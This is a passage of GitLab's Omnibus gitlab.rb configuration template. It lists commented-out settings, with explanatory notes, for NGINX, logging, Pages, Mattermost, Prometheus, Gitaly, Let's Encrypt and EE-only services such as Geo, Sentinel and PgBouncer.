# nginx['enable'] = true
# nginx['client_max_body_size'] = '250m'
# nginx['redirect_http_to_https'] = false
# nginx['redirect_http_to_https_port'] = 80

##! Most root CA's are included by default
# nginx['ssl_client_certificate'] = "/etc/gitlab/ssl/ca.crt"

##! enable/disable 2-way SSL client authentication
# nginx['ssl_verify_client'] = "off"

##! if ssl_verify_client on, verification depth in the client certificates chain
# nginx['ssl_verify_depth'] = "1"

# nginx['ssl_certificate'] = "/etc/gitlab/ssl/#{node['fqdn']}.crt"
# nginx['ssl_certificate_key'] = "/etc/gitlab/ssl/#{node['fqdn']}.key"
# nginx['ssl_ciphers'] = "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256"
# nginx['ssl_prefer_server_ciphers'] = "on"

##! **Recommended by: https://raymii.org/s/tutorials/Strong_SSL_Security_On_nginx.html
##!                   https://cipherli.st/**
# nginx['ssl_protocols'] = "TLSv1.1 TLSv1.2"

##! **Recommended in: https://nginx.org/en/docs/http/ngx_http_ssl_module.html**
# nginx['ssl_session_cache'] = "builtin:1000  shared:SSL:10m"

##! **Default according to https://nginx.org/en/docs/http/ngx_http_ssl_module.html**
# nginx['ssl_session_timeout'] = "5m"

# nginx['ssl_dhparam'] = nil # Path to dhparams.pem, eg. /etc/gitlab/ssl/dhparams.pem
# nginx['listen_addresses'] = ['*', '[::]']

##! **Defaults to forcing web browsers to always communicate using only HTTPS**
##! Docs: https://docs.gitlab.com/omnibus/settings/nginx.html#setting-http-strict-transport-security
# nginx['hsts_max_age'] = 31536000
# nginx['hsts_include_subdomains'] = false

##! **Docs: http://nginx.org/en/docs/http/ngx_http_gzip_module.html**
# nginx['gzip_enabled'] = true

##! **Override only if you use a reverse proxy**
##! Docs: https://docs.gitlab.com/omnibus/settings/nginx.html#setting-the-nginx-listen-port
# nginx['listen_port'] = nil

##! **Override only if your reverse proxy internally communicates over HTTP**
##! Docs: https://docs.gitlab.com/omnibus/settings/nginx.html#supporting-proxied-ssl
# nginx['listen_https'] = nil

# nginx['custom_gitlab_server_config'] = "location ^~ /foo-namespace/bar-project/raw/ {\n deny all;\n}\n"
# nginx['custom_nginx_config'] = "include /etc/nginx/conf.d/example.conf;"
# nginx['proxy_read_timeout'] = 3600
# nginx['proxy_connect_timeout'] = 300
# nginx['proxy_set_headers'] = {
#  "Host" => "$http_host_with_default",
#  "X-Real-IP" => "$remote_addr",
#  "X-Forwarded-For" => "$proxy_add_x_forwarded_for",
#  "X-Forwarded-Proto" => "https",
#  "X-Forwarded-Ssl" => "on",
#  "Upgrade" => "$http_upgrade",
#  "Connection" => "$connection_upgrade"
# }
# nginx['proxy_cache_path'] = 'proxy_cache keys_zone=gitlab:10m max_size=1g levels=1:2'
# nginx['proxy_cache'] = 'gitlab'
# nginx['http2_enabled'] = true
# nginx['real_ip_trusted_addresses'] = []
# nginx['real_ip_header'] = nil
# nginx['real_ip_recursive'] = nil
# nginx['custom_error_pages'] = {
#   '404' => {
#     'title' => 'Example title',
#     'header' => 'Example header',
#     'message' => 'Example message'
#   }
# }

### Advanced settings
# nginx['dir'] = "/var/opt/gitlab/nginx"
# nginx['log_directory'] = "/var/log/gitlab/nginx"
# nginx['worker_processes'] = 4
# nginx['worker_connections'] = 10240
# nginx['log_format'] = '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"'
# nginx['sendfile'] = 'on'
# nginx['tcp_nopush'] = 'on'
# nginx['tcp_nodelay'] = 'on'
# nginx['gzip'] = "on"
# nginx['gzip_http_version'] = "1.0"
# nginx['gzip_comp_level'] = "2"
# nginx['gzip_proxied'] = "any"
# nginx['gzip_types'] = [ "text/plain", "text/css", "application/x-javascript", "text/xml", "application/xml", "application/xml+rss", "text/javascript", "application/json" ]
# nginx['keepalive_timeout'] = 65
# nginx['cache_max_size'] = '5000m'
# nginx['server_names_hash_bucket_size'] = 64

### Nginx status
# nginx['status'] = {
#  "enable" => true,
#  "listen_addresses" => ["127.0.0.1"],
#  "fqdn" => "dev.example.com",
#  "port" => 9999,
#  "options" => {
#    "stub_status" => "on", # Turn on stats
#    "server_tokens" => "off", # Don't show the version of NGINX
#    "access_log" => "off", # Disable logs for stats
#    "allow" => "127.0.0.1", # Only allow access from localhost
#    "deny" => "all" # Deny access to anyone else
#  }
# }

################################################################################
## GitLab Logging
##! Docs: https://docs.gitlab.com/omnibus/settings/logs.html
################################################################################

# logging['svlogd_size'] = 200 * 1024 * 1024 # rotate after 200 MB of log data
# logging['svlogd_num'] = 30 # keep 30 rotated log files
# logging['svlogd_timeout'] = 24 * 60 * 60 # rotate after 24 hours
# logging['svlogd_filter'] = "gzip" # compress logs with gzip
# logging['svlogd_udp'] = nil # transmit log messages via UDP
# logging['svlogd_prefix'] = nil # custom prefix for log messages
# logging['logrotate_frequency'] = "daily" # rotate logs daily
# logging['logrotate_size'] = nil # do not rotate by size by default
# logging['logrotate_rotate'] = 30 # keep 30 rotated logs
# logging['logrotate_compress'] = "compress" # see 'man logrotate'
# logging['logrotate_method'] = "copytruncate" # see 'man logrotate'
# logging['logrotate_postrotate'] = nil # no postrotate command by default
# logging['logrotate_dateformat'] = nil # use date extensions for rotated files rather than numbers e.g. a value of "-%Y-%m-%d" would give rotated files like production.log-2016-03-09.gz

### UDP log forwarding
##! Docs: http://docs.gitlab.com/omnibus/settings/logs.html#udp-log-forwarding

##! remote host to ship log messages to via UDP
# logging['udp_log_shipping_host'] = nil

##! override the hostname used when logs are shipped via UDP,
##  by default the system hostname will be used.
# logging['udp_log_shipping_hostname'] = nil

##! remote port to ship log messages to via UDP
# logging['udp_log_shipping_port'] = 514

################################################################################
## Logrotate
##! Docs: https://docs.gitlab.com/omnibus/settings/logs.html#logrotate
##! You can disable built in logrotate feature.
################################################################################
# logrotate['enable'] = true

################################################################################
## Users and groups accounts
##! Disable management of users and groups accounts.
##! **Set only if creating accounts manually**
##! Docs: https://docs.gitlab.com/omnibus/settings/configuration.html#disable-user-and-group-account-management
################################################################################

# manage_accounts['enable'] = false

################################################################################
## Storage directories
##! Disable managing storage directories
##! Docs: https://docs.gitlab.com/omnibus/settings/configuration.html#disable-storage-directories-management
################################################################################

##! **Set only if the select directories are created manually**
# manage_storage_directories['enable'] = false
# manage_storage_directories['manage_etc'] = false

################################################################################
## Runtime directory
##! Docs: https://docs.gitlab.com//omnibus/settings/configuration.html#configuring-runtime-directory
################################################################################

# runtime_dir '/run'

################################################################################
## Git
##! Advanced setting for configuring git system settings for omnibus-gitlab
##! internal git
################################################################################

##! For multiple options under one header use array of comma separated values,
##! eg.:
##! { "receive" => ["fsckObjects = true"], "alias" => ["st = status", "co = checkout"] }

# omnibus_gitconfig['system'] = {
#  "pack" => ["threads = 1"],
#  "receive" => ["fsckObjects = true", "advertisePushOptions = true"],
#  "repack" => ["writeBitmaps = true"],
#  "transfer" => ["hideRefs=^refs/tmp/", "hideRefs=^refs/keep-around/"],
# }

################################################################################
## GitLab Pages
##! Docs: https://docs.gitlab.com/ce/pages/administration.html
################################################################################

##! Define to enable GitLab Pages
# pages_external_url "http://pages.example.com/"
# gitlab_pages['enable'] = false

##! Configure to expose GitLab Pages on external IP address, serving the HTTP
# gitlab_pages['external_http'] = []

##! Configure to expose GitLab Pages on external IP address, serving the HTTPS
# gitlab_pages['external_https'] = []

##! Configure to enable health check endpoint on GitLab Pages
# gitlab_pages['status_uri'] = "/@status"

##! Configure to use JSON structured logging in GitLab Pages
# gitlab_pages['log_format'] = "json"

##! Configure verbose logging for GitLab Pages
# gitlab_pages['log_verbose'] = false

##! Listen for requests forwarded by reverse proxy
# gitlab_pages['listen_proxy'] = "localhost:8090"

# gitlab_pages['redirect_http'] = true
# gitlab_pages['use_http2'] = true
# gitlab_pages['dir'] = "/var/opt/gitlab/gitlab-pages"
# gitlab_pages['log_directory'] = "/var/log/gitlab/gitlab-pages"

# gitlab_pages['artifacts_server'] = true
# gitlab_pages['artifacts_server_url'] = nil # Defaults to external_url + '/api/v4'
# gitlab_pages['artifacts_server_timeout'] = 10

##! Environments that do not support bind-mounting should set this parameter to
##! true. This is incompatible with the artifacts server
# gitlab_pages['inplace_chroot'] = false

##! Prometheus metrics for Pages docs: https://gitlab.com/gitlab-org/gitlab-pages/#enable-prometheus-metrics
# gitlab_pages['metrics_address'] = ":9235"

##! Configure the pages admin API
# gitlab_pages['admin_secret_token'] = 'custom secret'
# gitlab_pages['admin_https_listener'] = '0.0.0.0:5678'
# gitlab_pages['admin_https_cert'] = '/etc/gitlab/pages-admin.crt'
# gitlab_pages['admin_https_key'] = '/etc/gitlab/pages-admin.key'

##! Client side configuration for gitlab-pages admin API, in case pages runs on a different host
# gitlab_rails['pages_admin_address'] = 'pages.gitlab.example.com:5678'
# gitlab_rails['pages_admin_certificate'] = '/etc/gitlab/pages-admin.crt'

################################################################################
## GitLab Pages NGINX
################################################################################

# All the settings defined in the "GitLab Nginx" section are also available in this "GitLab Pages NGINX" section
# You just have to change the key "nginx['some_settings']" with "pages_nginx['some_settings']"

# Below you can find settings that are exclusive to "GitLab Pages NGINX"
# pages_nginx['enable'] = false

# gitlab_rails['pages_path'] = "/var/opt/gitlab/gitlab-rails/shared/pages"

################################################################################
## GitLab CI
##! Docs: https://docs.gitlab.com/ce/ci/quick_start/README.html
################################################################################

# gitlab_ci['gitlab_ci_all_broken_builds'] = true
# gitlab_ci['gitlab_ci_add_pusher'] = true
# gitlab_ci['builds_directory'] = '/var/opt/gitlab/gitlab-ci/builds'

################################################################################
## GitLab Mattermost
##! Docs: https://docs.gitlab.com/omnibus/gitlab-mattermost
################################################################################

# mattermost_external_url 'http://mattermost.example.com'

# mattermost['enable'] = false
# mattermost['username'] = 'mattermost'
# mattermost['group'] = 'mattermost'
# mattermost['uid'] = nil
# mattermost['gid'] = nil
# mattermost['home'] = '/var/opt/gitlab/mattermost'
# mattermost['database_name'] = 'mattermost_production'
# mattermost['env'] = {}

# mattermost['service_address'] = "127.0.0.1"
# mattermost['service_port'] = "8065"
# mattermost['service_site_url'] = nil
# mattermost['service_allowed_untrusted_internal_connections'] = ""
# mattermost['service_enable_api_team_deletion'] = true
# mattermost['team_site_name'] = "GitLab Mattermost"
# mattermost['sql_driver_name'] = 'mysql'
# mattermost['sql_data_source'] = "mmuser:mostest@tcp(dockerhost:3306)/mattermost_test?charset=utf8mb4,utf8"
# mattermost['log_file_directory'] = '/var/log/gitlab/mattermost/'
# mattermost['gitlab_enable'] = false
# mattermost['gitlab_id'] = "12345656"
# mattermost['gitlab_secret'] = "123456789"
# mattermost['gitlab_scope'] = ""
# mattermost['gitlab_auth_endpoint'] = "http://gitlab.example.com/oauth/authorize"
# mattermost['gitlab_token_endpoint'] = "http://gitlab.example.com/oauth/token"
# mattermost['gitlab_user_api_endpoint'] = "http://gitlab.example.com/api/v4/user"
# mattermost['file_directory'] = "/var/opt/gitlab/mattermost/data"
# mattermost['plugin_directory'] = "/var/opt/gitlab/mattermost/plugins"
# mattermost['plugin_client_directory'] = "/var/opt/gitlab/mattermost/client-plugins"

################################################################################
## Mattermost NGINX
################################################################################

# All the settings defined in the "GitLab NGINX" section are also available in this "Mattermost NGINX" section
# You just have to change the key "nginx['some_settings']" with "mattermost_nginx['some_settings']"

# Below you can find settings that are exclusive to "Mattermost NGINX"
# mattermost_nginx['enable'] = false

# mattermost_nginx['custom_gitlab_mattermost_server_config'] = "location ^~ /foo-namespace/bar-project/raw/ {\n deny all;\n}\n"
# mattermost_nginx['proxy_set_headers'] = {
#   "Host" => "$http_host",
#   "X-Real-IP" => "$remote_addr",
#   "X-Forwarded-For" => "$proxy_add_x_forwarded_for",
#   "X-Frame-Options" => "SAMEORIGIN",
#   "X-Forwarded-Proto" => "https",
#   "X-Forwarded-Ssl" => "on",
#   "Upgrade" => "$http_upgrade",
#   "Connection" => "$connection_upgrade"
# }


################################################################################
## Registry NGINX
################################################################################

# All the settings defined in the "GitLab NGINX" section are also available in this "Registry NGINX" section
# You just have to change the key "nginx['some_settings']" with "registry_nginx['some_settings']"

# Below you can find settings that are exclusive to "Registry NGINX"
# registry_nginx['enable'] = false

# registry_nginx['proxy_set_headers'] = {
#  "Host" => "$http_host",
#  "X-Real-IP" => "$remote_addr",
#  "X-Forwarded-For" => "$proxy_add_x_forwarded_for",
#  "X-Forwarded-Proto" => "https",
#  "X-Forwarded-Ssl" => "on"
# }

################################################################################
## Prometheus
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/
################################################################################

# prometheus['enable'] = true
# prometheus['monitor_kubernetes'] = true
# prometheus['username'] = 'gitlab-prometheus'
# prometheus['uid'] = nil
# prometheus['gid'] = nil
# prometheus['shell'] = '/bin/sh'
# prometheus['home'] = '/var/opt/gitlab/prometheus'
# prometheus['log_directory'] = '/var/log/gitlab/prometheus'
# prometheus['rules_files'] = ['/var/opt/gitlab/prometheus/rules/*.rules']
# prometheus['scrape_interval'] = 15
# prometheus['scrape_timeout'] = 15
# prometheus['chunk_encoding_version'] = 2
#
### Custom scrape configs
#
# Prometheus can scrape additional jobs via scrape_configs.  The default automatically
# includes all of the exporters supported by the omnibus config.
#
# See: https://prometheus.io/docs/operating/configuration/#<scrape_config>
#
# Example:
#
# prometheus['scrape_configs'] = [
#   {
#     'job_name': 'example',
#     'static_configs' => [
#       'targets' => ['hostname:port'],
#     ],
#   },
# ]
#
### Prometheus Memory Management
#
# Prometheus needs to be configured for how much memory is used.
# * This sets the target heap size.
# * This value accounts for approximately 2/3 of the memory used by the server.
# * The recommended memory is 4kb per unique metrics time-series.
# See: https://prometheus.io/docs/operating/storage/#memory-usage
#
# prometheus['target_heap_size'] = (
#   # Use 25mb + 2% of total memory for Prometheus memory.
#   26_214_400 + (node['memory']['total'].to_i * 1024 * 0.02 )
# ).to_i
#
# prometheus['flags'] = {
#   'storage.local.path' => "#{node['gitlab']['prometheus']['home']}/data",
#   'storage.local.chunk-encoding-version' => user_config['chunk-encoding-version'],
#   'storage.local.target-heap-size' => node['gitlab']['prometheus']['target-heap-size'],
#   'config.file' => "#{node['gitlab']['prometheus']['home']}/prometheus.yml"
# }

##! Advanced settings. Should be changed only if absolutely needed.
# prometheus['listen_address'] = 'localhost:9090'

################################################################################
## Prometheus Alertmanager
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/alertmanager.html
################################################################################

# alertmanager['enable'] = true
# alertmanager['home'] = '/var/opt/gitlab/alertmanager'
# alertmanager['log_directory'] = '/var/log/gitlab/alertmanager'
# alertmanager['admin_email'] = 'admin@example.com'
# alertmanager['flags'] = {
#   'web.listen-address' => "#{node['gitlab']['alertmanager']['listen_address']}"
#   'storage.path' => "#{node['gitlab']['alertmanager']['home']}/data"
#   'config.file' => "#{node['gitlab']['alertmanager']['home']}/alertmanager.yml"
# }

##! Advanced settings. Should be changed only if absolutely needed.
# alertmanager['listen_address'] = 'localhost:9093'

################################################################################
## Prometheus Node Exporter
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/node_exporter.html
################################################################################

# node_exporter['enable'] = true
# node_exporter['home'] = '/var/opt/gitlab/node-exporter'
# node_exporter['log_directory'] = '/var/log/gitlab/node-exporter'
# node_exporter['flags'] = {
#   'collector.textfile.directory' => "#{node['gitlab']['node-exporter']['home']}/textfile_collector"
# }

##! Advanced settings. Should be changed only if absolutely needed.
# node_exporter['listen_address'] = 'localhost:9100'

################################################################################
## Prometheus Redis exporter
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/redis_exporter.html
################################################################################

# redis_exporter['enable'] = true
# redis_exporter['log_directory'] = '/var/log/gitlab/redis-exporter'
# redis_exporter['flags'] = {
#   'redis.addr' => "unix://#{node['gitlab']['gitlab-rails']['redis_socket']}",
# }

##! Advanced settings. Should be changed only if absolutely needed.
# redis_exporter['listen_address'] = 'localhost:9121'

################################################################################
## Prometheus Postgres exporter
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/postgres_exporter.html
################################################################################

# postgres_exporter['enable'] = true
# postgres_exporter['home'] = '/var/opt/gitlab/postgres-exporter'
# postgres_exporter['log_directory'] = '/var/log/gitlab/postgres-exporter'
# postgres_exporter['flags'] = {}
# postgres_exporter['listen_address'] = 'localhost:9187'

################################################################################
## Prometheus PgBouncer exporter (EE only)
##! Docs: https://docs.gitlab.com/ee/administration/monitoring/prometheus/pgbouncer_exporter.html
################################################################################

# pgbouncer_exporter['enable'] = false
# pgbouncer_exporter['log_directory'] = "/var/log/gitlab/pgbouncer-exporter"
# pgbouncer_exporter['listen_address'] = 'localhost:9188'

################################################################################
## Prometheus Gitlab monitor
##! Docs: https://docs.gitlab.com/ce/administration/monitoring/prometheus/gitlab_monitor_exporter.html
################################################################################


# gitlab_monitor['enable'] = true
# gitlab_monitor['log_directory'] = "/var/log/gitlab/gitlab-monitor"
# gitlab_monitor['home'] = "/var/opt/gitlab/gitlab-monitor"

##! Advanced settings. Should be changed only if absolutely needed.
# gitlab_monitor['listen_address'] = 'localhost'
# gitlab_monitor['listen_port'] = '9168'

# To completely disable prometheus, and all of it's exporters, set to false
# prometheus_monitoring['enable'] = true

################################################################################
## Gitaly
##! Docs:
################################################################################

# The gitaly['enable'] option exists for the purpose of cluster
# deployments, see https://docs.gitlab.com/ee/administration/gitaly/index.html .
# gitaly['enable'] = true
# gitaly['dir'] = "/var/opt/gitlab/gitaly"
# gitaly['log_directory'] = "/var/log/gitlab/gitaly"
# gitaly['bin_path'] = "/opt/gitlab/embedded/bin/gitaly"
# gitaly['env_directory'] = "/opt/gitlab/etc/gitaly"
# gitaly['env'] = {
#  'PATH' => "/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/bin",
#  'HOME' => '/var/opt/gitlab'
# }
# gitaly['socket_path'] = "/var/opt/gitlab/gitaly/gitaly.socket"
# gitaly['listen_addr'] = "localhost:8075"
# gitaly['prometheus_listen_addr'] = "localhost:9236"
# gitaly['logging_level'] = "warn"
# gitaly['logging_format'] = "json"
# gitaly['logging_sentry_dsn'] = "https://<key>:<secret>@sentry.io/<project>"
# gitaly['logging_ruby_sentry_dsn'] = "https://<key>:<secret>@sentry.io/<project>"
# gitaly['prometheus_grpc_latency_buckets'] = "[0.001, 0.005, 0.025, 0.1, 0.5, 1.0, 10.0, 30.0, 60.0, 300.0, 1500.0]"
# gitaly['auth_token'] = '<secret>'
# gitaly['auth_transitioning'] = false # When true, auth is logged to Prometheus but NOT enforced
# gitaly['ruby_max_rss'] = 300000000 # RSS threshold in bytes for triggering a gitaly-ruby restart
# gitaly['ruby_graceful_restart_timeout'] = '10m' # Grace time for a gitaly-ruby process to finish ongoing requests
# gitaly['ruby_restart_delay'] = '5m' # Period of sustained high RSS that needs to be observed before restarting gitaly-ruby
# gitaly['ruby_num_workers'] = 3 # Number of gitaly-ruby worker processes. Minimum 2, default 2.
# gitaly['storage'] = [
#   {
#     'name' => 'default',
#     'path' => '/mnt/nfs-01/git-data/repositories'
#   },
#   {
#     'name' => 'secondary',
#     'path' => '/mnt/nfs-02/git-data/repositories'
#   }
# ]
# gitaly['concurrency'] = [
#   {
#     'rpc' => "/gitaly.SmartHTTPService/PostReceivePack",
#     'max_per_repo' => 20
#   }, {
#     'rpc' => "/gitaly.SSHService/SSHUploadPack",
#     'max_per_repo' => 5
#   }
# ]

################################################################################
# Storage check
################################################################################
# storage_check['enable'] = false
# storage_check['target'] = 'unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket'
# storage_check['log_directory'] = '/var/log/gitlab/storage-check'

################################################################################
# Let's Encrypt integration
################################################################################
# letsencrypt['enable'] = nil
# letsencrypt['contact_emails'] = [] # This should be an array of email addresses to add as contacts
# letsencrypt['group'] = 'root'
# letsencrypt['key_size'] = 2048
# letsencrypt['owner'] = 'root'
# letsencrypt['wwwroot'] = '/var/opt/gitlab/nginx/www'
# See http://docs.gitlab.com/omnibus/settings/ssl.html#automatic-renewal for more on these sesttings
# letsencrypt['auto_renew'] = true
# letsencrypt['auto_renew_hour'] = 0
# letsencrypt['auto_renew_minute'] = nil # Should be a number or cron expression, if specified.
# letsencrypt['auto_renew_day_of_month'] = "*/4"

################################################################################
################################################################################
##                  Configuration Settings for GitLab EE only                 ##
################################################################################
################################################################################


################################################################################
## Auxiliary cron jobs applicable to GitLab EE only
################################################################################
#
# gitlab_rails['geo_file_download_dispatch_worker_cron'] = "*/10 * * * *"
# gitlab_rails['geo_repository_sync_worker_cron'] = "*/5 * * * *"
# gitlab_rails['geo_prune_event_log_worker_cron'] = "*/5 * * * *"
# gitlab_rails['geo_repository_verification_primary_batch_worker_cron'] = "*/5 * * * *"
# gitlab_rails['geo_repository_verification_secondary_scheduler_worker_cron'] = "*/5 * * * *"
# gitlab_rails['geo_migrated_local_files_clean_up_worker_cron'] = "15 */6 * * *"
# gitlab_rails['ldap_sync_worker_cron'] = "30 1 * * *"
# gitlab_rails['ldap_group_sync_worker_cron'] = "0 * * * *"
# gitlab_rails['historical_data_worker_cron'] = "0 12 * * *"
# gitlab_rails['pseudonymizer_worker_cron'] = "0 23 * * *"

################################################################################
## Kerberos (EE Only)
##! Docs: https://docs.gitlab.com/ee/integration/kerberos.html#http-git-access
################################################################################

# gitlab_rails['kerberos_enabled'] = true
# gitlab_rails['kerberos_keytab'] = /etc/http.keytab
# gitlab_rails['kerberos_service_principal_name'] = HTTP/gitlab.example.com@EXAMPLE.COM
# gitlab_rails['kerberos_use_dedicated_port'] = true
# gitlab_rails['kerberos_port'] = 8443
# gitlab_rails['kerberos_https'] = true

################################################################################
## Package repository (EE Only)
##! Docs: https://docs.gitlab.com/ee/administration/maven_packages.md
################################################################################

# gitlab_rails['packages_enabled'] = true
# gitlab_rails['packages_storage_path'] = "/var/opt/gitlab/gitlab-rails/shared/packages"
# gitlab_rails['packages_object_store_enabled'] = false
# gitlab_rails['packages_object_store_direct_upload'] = false
# gitlab_rails['packages_object_store_background_upload'] = true
# gitlab_rails['packages_object_store_proxy_download'] = false
# gitlab_rails['packages_object_store_remote_directory'] = "packages"
# gitlab_rails['packages_object_store_connection'] = {
#   'provider' => 'AWS',
#   'region' => 'eu-west-1',
#   'aws_access_key_id' => 'AWS_ACCESS_KEY_ID',
#   'aws_secret_access_key' => 'AWS_SECRET_ACCESS_KEY',
#   # # The below options configure an S3 compatible host instead of AWS
#   # 'host' => 's3.amazonaws.com',
#   # 'aws_signature_version' => 4, # For creation of signed URLs. Set to 2 if provider does not support v4.
#   # 'endpoint' => 'https://s3.amazonaws.com', # default: nil - Useful for S3 compliant services such as DigitalOcean Spaces
#   # 'path_style' => false # Use 'host/bucket_name/object' instead of 'bucket_name.host/object'
# }

################################################################################
## GitLab Sentinel (EE Only)
##! Docs: http://docs.gitlab.com/ce/administration/high_availability/redis.html#high-availability-with-sentinel
################################################################################

##! **Make sure you configured all redis['master_*'] keys above before
##!   continuing.**

##! To enable Sentinel and disable all other services in this machine,
##! uncomment the line below (if you've enabled Redis role, it will keep it).
##! Docs: https://docs.gitlab.com/ce/administration/high_availability/redis.html
# redis_sentinel_role['enable'] = true

# sentinel['enable'] = true

##! Bind to all interfaces, uncomment to specify an IP and bind to a single one
# sentinel['bind'] = '0.0.0.0'

##! Uncomment to change default port
# sentinel['port'] = 26379

#### Support to run sentinels in a Docker or NAT environment
#####! Docs: https://redis.io/topics/sentinel#sentinel-docker-nat-and-possible-issues
# In an standard case, Sentinel will run in the same network service as Redis, so the same IP will be announce for Redis and Sentinel
# Only define these values if it is needed to announce for Sentinel a differen IP service than Redis
# sentinel['announce_ip'] = nil # If not defined, its value will be taken from redis['announce_ip'] or nil if not present
# sentinel['announce_port'] = nil # If not defined, its value will be taken from sentinel['port'] or nil if redis['announce_ip'] not present

##! Quorum must reflect the amount of voting sentinels it take to start a
##! failover.
##! **Value must NOT be greater then the amount of sentinels.**
##! The quorum can be used to tune Sentinel in two ways:
##! 1. If a the quorum is set to a value smaller than the majority of Sentinels
##!    we deploy, we are basically making Sentinel more sensible to master
##!    failures, triggering a failover as soon as even just a minority of
##!    Sentinels is no longer able to talk with the master.
##! 2. If a quorum is set to a value greater than the majority of Sentinels, we
##!    are making Sentinel able to failover only when there are a very large
##!    number (larger than majority) of well connected Sentinels which agree
##!    about the master being down.
# sentinel['quorum'] = 1

### Consider unresponsive server down after x amount of ms.
# sentinel['down_after_milliseconds'] = 10000

### Specifies the failover timeout in milliseconds.
##! It is used in many ways:
##!
##! - The time needed to re-start a failover after a previous failover was
##!   already tried against the same master by a given Sentinel, is two
##!   times the failover timeout.
##!
##! - The time needed for a slave replicating to a wrong master according
##!   to a Sentinel current configuration, to be forced to replicate
##!   with the right master, is exactly the failover timeout (counting since
##!   the moment a Sentinel detected the misconfiguration).
##!
##! - The time needed to cancel a failover that is already in progress but
##!   did not produced any configuration change (SLAVEOF NO ONE yet not
##!   acknowledged by the promoted slave).
##!
##! - The maximum time a failover in progress waits for all the slaves to be
##!   reconfigured as slaves of the new master. However even after this time
##!   the slaves will be reconfigured by the Sentinels anyway, but not with
##!   the exact parallel-syncs progression as specified.
# sentinel['failover_timeout'] = 60000

################################################################################
## GitLab Sidekiq Cluster (EE only)
################################################################################

##! GitLab Enterprise Edition allows one to start an extra set of Sidekiq processes
##! besides the default one. These processes can be used to consume a dedicated set
##! of queues. This can be used to ensure certain queues always have dedicated
##! workers, no matter the amount of jobs that need to be processed.

# sidekiq_cluster['enable'] = false
# sidekiq_cluster['ha'] = false
# sidekiq_cluster['log_directory'] = "/var/log/gitlab/sidekiq-cluster"
# sidekiq_cluster['interval'] = 5 # The number of seconds to wait between worker checks
# sidekiq_cluster['max_concurrency'] = 50 # The maximum number of threads each Sidekiq process should run

##! Each entry in the queue_groups array denotes a group of queues that have to be processed by a
##! Sidekiq process. Multiple queues can be processed by the same process by
##! separating them with a comma within the group entry

# sidekiq_cluster['queue_groups'] = [
#   "process_commit,post_receive",
#   "gitlab_shell"
# ]
#

##! If negate is enabled then sidekiq-cluster will process all the queues that
##! don't match those in queue_groups.

# sidekiq_cluster['negate'] = false

################################################################################
## Additional Database Settings (EE only)
##! Docs: https://docs.gitlab.com/ee/administration/database_load_balancing.html
################################################################################
# gitlab_rails['db_load_balancing'] = { 'hosts' => ['secondary1.example.com'] }

################################################################################
## GitLab Geo
##! Docs: https://docs.gitlab.com/ee/gitlab-geo
################################################################################
# geo_primary_role['enable'] = false
# geo_secondary_role['enable'] = false

################################################################################
## GitLab Geo Secondary (EE only)
################################################################################
# geo_secondary['auto_migrate'] = true
# geo_secondary['db_adapter'] = "postgresql"
# geo_secondary['db_encoding'] = "unicode"
# geo_secondary['db_collation'] = nil
# geo_secondary['db_database'] = "gitlabhq_geo_production"
# geo_secondary['db_pool'] = 10
# geo_secondary['db_username'] = "gitlab_geo"
# geo_secondary['db_password'] = nil
# geo_secondary['db_host'] = "/var/opt/gitlab/geo-postgresql"
# geo_secondary['db_port'] = 5431
# geo_secondary['db_socket'] = nil
# geo_secondary['db_sslmode'] = nil
# geo_secondary['db_sslcompression'] = 0
# geo_secondary['db_sslrootcert'] = nil
# geo_secondary['db_sslca'] = nil
# geo_secondary['db_fdw'] = true

################################################################################
## GitLab Geo Secondary Tracking Database (EE only)
################################################################################

# geo_postgresql['enable'] = false
# geo_postgresql['ha'] = false
# geo_postgresql['dir'] = '/var/opt/gitlab/geo-postgresql'
# geo_postgresql['data_dir'] = '/var/opt/gitlab/geo-postgresql/data'
# geo_postgresql['pgbouncer_user'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil

################################################################################
# Pgbouncer (EE only)
# See [GitLab PgBouncer documentation](http://docs.gitlab.com/omnibus/settings/database.html#enabling-pgbouncer-ee-only)
# See the [PgBouncer page](https://pgbouncer.github.io/config.html) for details
################################################################################
# pgbouncer['enable'] = false
# pgbouncer['log_directory'] = '/var/log/gitlab/pgbouncer'
# pgbouncer['data_directory'] = '/var/opt/gitlab/pgbouncer'
# pgbouncer['listen_addr'] = '0.0.0.0'
# pgbouncer['listen_port'] = '6432'
# pgbouncer['pool_mode'] = 'transaction'
# pgbouncer['server_reset_query'] = 'DISCARD ALL'
# pgbouncer['application_name_add_host'] = '1'
# pgbouncer['max_client_conn'] = '2048'
# pgbouncer['default_pool_size'] = '100'
# pgbouncer['min_pool_size'] = '0'
# pgbouncer['reserve_pool_size'] = '5'
# pgbouncer['reserve_pool_timeout'] = '5.0'
# pgbouncer['server_round_robin'] = '0'
# pgbouncer['log_connections'] = '0'
# pgbouncer['server_idle_timeout'] = '30'
# pgbouncer['dns_max_ttl'] = '15.0'
# pgbouncer['dns_zone_check_period'] = '0'
# pgbouncer['dns_nxdomain_ttl'] = '15.0'
# pgbouncer['admin_users'] = %w(gitlab-psql postgres pgbouncer)
# pgbouncer['stats_users'] = %w(gitlab-psql postgres pgbouncer)
# pgbouncer['ignore_startup_parameters'] = 'extra_float_digits'
# pgbouncer['databases'] = {
#   DATABASE_NAME: {
#     host: HOSTNAME,
#     port: PORT
#     user: USERNAME,
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
#   }
#   ...
# }
# pgbouncer['logfile'] = nil
# pgbouncer['unix_socket_dir'] = nil
# pgbouncer['unix_socket_mode'] = '0777'
# pgbouncer['unix_socket_group'] = nil
# pgbouncer['auth_type'] = 'md5'
# pgbouncer['auth_hba_file'] = nil
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
# pgbouncer['users'] = {
#   {
#     name: USERNAME,
#     password: MD5_PASSWORD_HASH
#   }
# }
# postgresql['pgbouncer_user'] = nil
# postgresql['pgbouncer_user_password'] = nil
# pgbouncer['server_reset_query_always'] = 0
# pgbouncer['server_check_query'] = 'select 1'
